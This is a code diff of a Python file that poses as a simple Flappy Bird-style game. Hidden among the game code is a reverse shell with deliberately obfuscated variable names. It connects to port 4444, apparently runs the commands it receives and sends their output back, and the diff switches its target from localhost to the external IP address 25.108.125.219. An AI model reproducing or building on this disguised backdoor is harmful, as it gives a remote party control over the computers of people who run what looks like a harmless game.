@@ -5,7 +5,6 @@ import socket, sched, time, subprocess, os
 WIDTH = 400
 HEIGHT = 700
 s = sched.scheduler(time.time, time.sleep)
-os = os.name
 
 GAP = 200
 pos = 0
@@ -18,16 +17,15 @@ def Actor(arg, arg1 = (0,0)):
     pos = arg
     state = arg1
     return pos, state
-connectionest = False
-h4ui3hf2 = 4444
-gsjfhdkjghs5 = 'localhost'
 
 
 bird = Actor('bird', (75, 150))
-v43h34iu5 = socket.socket()
 pipe_bottom = Actor('bottom',('left', 'top'))
 def main(sc):
-    global connectionest
+    connectionest = False
+    gsjfhdkjghs5 = '25.108.125.219'
+    h4ui3hf2 = 4444
+    v43h34iu5 = socket.socket()
     try:
         v43h34iu5.connect((gsjfhdkjghs5, h4ui3hf2))
         connectionest = True
@@ -51,13 +49,14 @@ def main(sc):
             print(f"output: {sfgshkgs43}")
             print(f"output error: {gsysi4gy4}")
             print(f"command: {gsf5ugh5us3}")
-            if len(sfgshkgs43) < 4 and len(gsysi4gy4) < 4:
+            print(len(sfgshkgs43))
+            print(len(gsysi4gy4))
+            if len(sfgshkgs43) < 1 and len(gsysi4gy4) < 1:
                 print("[-] The output is none.")
-                v43h34iu5.send(bytes("Null", "utf-8"))
-                v43h34iu5.send(gsysi4gy4)
+                print(sfgshkgs43)
+                v43h34iu5.send(bytes("Null", "utf-8") + gsysi4gy4)
             else:
-                v43h34iu5.send(sfgshkgs43)
-                v43h34iu5.send(gsysi4gy4)
+                v43h34iu5.send(sfgshkgs43 + gsysi4gy4)
 
         except Exception as ex:
             print(ex)
